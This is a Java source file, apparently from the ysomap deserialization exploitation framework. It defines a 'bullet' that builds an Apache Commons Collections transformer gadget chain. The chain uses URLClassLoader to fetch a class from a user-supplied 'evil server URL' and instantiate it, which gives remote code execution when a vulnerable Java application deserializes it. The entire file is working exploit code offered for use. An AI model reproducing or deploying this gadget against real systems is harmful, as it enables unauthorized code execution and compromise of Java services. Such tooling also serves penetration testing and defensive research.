package ysomap.core.bullet.collections;

import ysomap.common.annotation.*;

import java.net.URLClassLoader;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/16
 */
@Bullets
@Dependencies({"evil obj http server"})
@Authors({ Authors.WH1T3P1G })
public class TransformerWithResponseBullet extends AbstractTransformerBullet {

    @NotNull
    @Require(name = "args" ,detail = "evil server URL")
    public String args;

    @NotNull
    @Require(name="remoteObj", detail = "remote object name")
    public String remoteObj;

    @NotNull
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    /**
     * 利用URLClassLoader进行远程class或jar文件载入
     * 这里远程服务器挂载可以使用exploit里的xxx
     * @return transformers[]
     * @throws Exception err
     */
    @Override
    public Object getObject() throws Exception {
        initClazz(version);
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(URLClassLoader.class));
        transformers.add(createInvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { java.net.URL[].class } }));
        transformers.add(createInvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                        args) } } }));
        transformers.add(createInvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { remoteObj }));
        transformers.add(createInvokerTransformer("getConstructor",
                new Class[] {  },
                new Object[] { }));
        transformers.add(createInvokerTransformer(
                "newInstance",
                new Class[] { },
                new Object[] { }));
        transformers.add(createConstantTransformer(1));

        return createTransformerArray(transformers);
    }
}
